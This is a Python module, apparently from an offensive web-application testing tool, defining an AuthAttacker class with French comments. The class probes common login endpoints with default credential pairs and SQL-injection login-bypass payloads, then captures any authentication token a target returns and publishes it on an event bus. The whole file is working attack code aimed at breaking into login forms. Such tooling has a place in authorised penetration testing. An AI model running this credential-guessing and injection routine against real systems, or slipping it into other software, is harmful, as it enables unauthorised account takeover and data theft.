# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

from __future__ import annotations

import structlog

from hdwp.core.bus.event_bus import AsyncEventBus
from hdwp.core.bus.events import CREDENTIALS_CAPTURED
from hdwp.core.http_client import build_client

log = structlog.get_logger()


class AuthAttacker:
    """
    Tente d'obtenir un token d'authentification par attaque quand aucun
    credential n'est configuré (mode offensif).

    Stratégies dans l'ordre :
    1. Credentials par défaut communs
    2. SQL injection bypass sur le formulaire de login
    Si réussi → émet CREDENTIALS_CAPTURED sur le bus.
    """

    LOGIN_PATHS = [
        "/login",
        "/api/login",
        "/api/auth/login",
        "/api/auth/signin",
        "/api/signin",
        "/auth/login",
        "/api/v1/login",
        "/api/v1/auth/login",
        "/users/login",
        "/api/users/login",
    ]

    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("admin", "Password1!"),
        ("test", "test"),
        ("user", "user"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("demo", "demo"),
    ]

    SQLI_PAYLOADS = [
        ("admin' OR '1'='1'--", "anything"),
        ("' OR 1=1--", "anything"),
        ("admin'--", "anything"),
        ("' OR '1'='1", "' OR '1'='1"),
    ]

    _BODY_VARIANTS = [
        lambda u, p: {"username": u, "password": p},
        lambda u, p: {"email": u, "password": p},
        lambda u, p: {"login": u, "password": p},
        lambda u, p: {"user": {"email": u, "password": p}},
    ]

    async def try_attack(self, base_url: str, bus: AsyncEventBus) -> bool:
        base = base_url.rstrip("/")
        for path in self.LOGIN_PATHS:
            url = f"{base}{path}"
            for username, password in self.DEFAULT_CREDS:
                token = await self._attempt(url, username, password)
                if token:
                    await self._emit(bus, token, url)
                    return True
            for username, password in self.SQLI_PAYLOADS:
                token = await self._attempt(url, username, password)
                if token:
                    await self._emit(bus, token, url)
                    return True
        log.debug("auth_attacker.no_token_found", base_url=base_url)
        return False

    async def _attempt(self, url: str, username: str, password: str) -> str | None:
        for body_fn in self._BODY_VARIANTS:
            try:
                async with build_client(timeout=5.0, follow_redirects=True) as client:
                    resp = await client.post(url, json=body_fn(username, password))
                    if resp.status_code in (200, 201):
                        token = self._extract_token(resp)
                        if token:
                            log.info(
                                "auth_attacker.token_found",
                                url=url,
                                username=username[:20],
                            )
                            return token
            except Exception:  # noqa: BLE001
                pass
        return None

    @staticmethod
    def _extract_token(resp) -> str | None:  # type: ignore[no-untyped-def]
        try:
            data = resp.json()
            if not isinstance(data, dict):
                return None
            for key in ("token", "access_token", "auth_token", "jwt", "id_token"):
                val = data.get(key)
                if isinstance(val, str) and len(val) > 8:
                    return val
            nested = data.get("data") or data.get("user") or data.get("result")
            if isinstance(nested, dict):
                for key in ("token", "access_token", "auth_token", "jwt"):
                    val = nested.get(key)
                    if isinstance(val, str) and len(val) > 8:
                        return val
        except Exception:  # noqa: BLE001
            pass
        return None

    @staticmethod
    async def _emit(bus: AsyncEventBus, token: str, url: str) -> None:
        await bus.emit(
            CREDENTIALS_CAPTURED,
            {
                "token_type": "bearer",
                "token_value": token,
                "role_name": "attacker_1",
                "source_url": url,
            },
            source="auth_attacker",
        )
